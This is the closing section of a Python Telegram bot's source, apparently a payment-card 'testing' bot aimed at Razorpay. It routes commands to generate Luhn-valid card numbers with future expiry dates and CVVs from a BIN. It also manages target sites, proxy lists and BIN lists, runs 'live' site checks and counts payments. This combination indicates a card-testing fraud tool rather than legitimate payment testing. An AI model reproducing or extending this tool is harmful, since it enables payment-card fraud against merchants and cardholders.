            f"  {e('bin')}   BINs:      <code>{bins}</code>\n"
            f"  {e('card')}  Generated: <code>{gen}</code>\n"
            f"  {e('money')} Payments:  <code>{pays}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
        return

    if data in ("nav_gen", "nav_split"):
        text = (
            f"{e('card')} <b>/gen BIN amount</b>\n  <code>/gen 411111 100</code>\n\n"
            f"{e('mass')} <b>/split N</b>\n  Reply to a .txt file\n\n"
            f"{e('check')} Luhn-valid • Future expiry • Correct CVV"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
        return

    # Generic nav_<dest> back routing
    if data.startswith("nav_"):
        dest = data[4:]
        await q.edit_message_text(
            f"{e('loading')} Use /{dest} for more options.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
        return


# ══════════════════════════════════════════════════
#   ERROR HANDLER
# ══════════════════════════════════════════════════
async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error("Unhandled exception", exc_info=ctx.error)
    if isinstance(update, Update) and update.effective_message:
        try:
            await update.effective_message.reply_text(
                f"{e('error')} An error occurred. Please try again.",
                parse_mode=ParseMode.HTML)
        except Exception:
            pass


# ══════════════════════════════════════════════════
#   STARTUP CHECK
# ══════════════════════════════════════════════════
async def post_init(app) -> None:
    try:
        await redis.set("bot:heartbeat", str(int(time.time())))
        val = await redis.get("bot:heartbeat")
        logger.info(f"Redis OK — heartbeat: {val}")
        s = await redis.llen(RK_SITES)
        p = await redis.llen(RK_PROXIES)
        b = await redis.llen(RK_BINS)
        logger.info(f"Data — sites:{s} proxies:{p} bins:{b}")
    except Exception as ex:
        logger.error(f"Redis startup error: {ex}")


# ══════════════════════════════════════════════════
#   MAIN
# ══════════════════════════════════════════════════
def main() -> None:
    logger.info("Starting Razorpay Testing Bot v5.0")
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    # Public (auth-gated internally)
    app.add_handler(CommandHandler("start",      cmd_start))
    app.add_handler(CommandHandler("gen",        cmd_gen))
    app.add_handler(CommandHandler("split",      cmd_split))
    app.add_handler(CommandHandler("help",       cmd_help))
    app.add_handler(CommandHandler("info",       cmd_info))

    # Admin / hidden
    app.add_handler(CommandHandler("sudo",       cmd_sudo))
    app.add_handler(CommandHandler("unsudo",     cmd_unsudo))
    app.add_handler(CommandHandler("sudolist",   cmd_sudolist))
    app.add_handler(CommandHandler("addsite",    cmd_addsite))
    app.add_handler(CommandHandler("live",       cmd_live))
    app.add_handler(CommandHandler("checksite",  cmd_checksite))
    app.add_handler(CommandHandler("rmsite",     cmd_rmsite))
    app.add_handler(CommandHandler("addpxy",     cmd_addpxy))
    app.add_handler(CommandHandler("proxy",      cmd_proxy))
    app.add_handler(CommandHandler("testpxy",    cmd_testpxy))
    app.add_handler(CommandHandler("rmpxy",      cmd_rmpxy))
    app.add_handler(CommandHandler("clrpxy",     cmd_clrpxy))
    app.add_handler(CommandHandler("addbim",     cmd_addbim))
    app.add_handler(CommandHandler("chkbim",     cmd_chkbim))
    app.add_handler(CommandHandler("rmbin",      cmd_rmbin))
    app.add_handler(CommandHandler("binlookup",  cmd_binlookup))
    app.add_handler(CommandHandler("fuck",       cmd_fuck))
    app.add_handler(CommandHandler("stop",       cmd_stop))
    app.add_handler(CommandHandler("stats",      cmd_stats))

    # Inline callbacks
    app.add_handler(CallbackQueryHandler(callbacks))

    # Auto URL scan — text messages and .txt files
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(
        filters.Document.MimeType("text/plain"), handle_message))

    app.add_error_handler(error_handler)

    logger.info(f"Admin UID: {ADMIN_USER_ID}")
    logger.info("Polling…")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
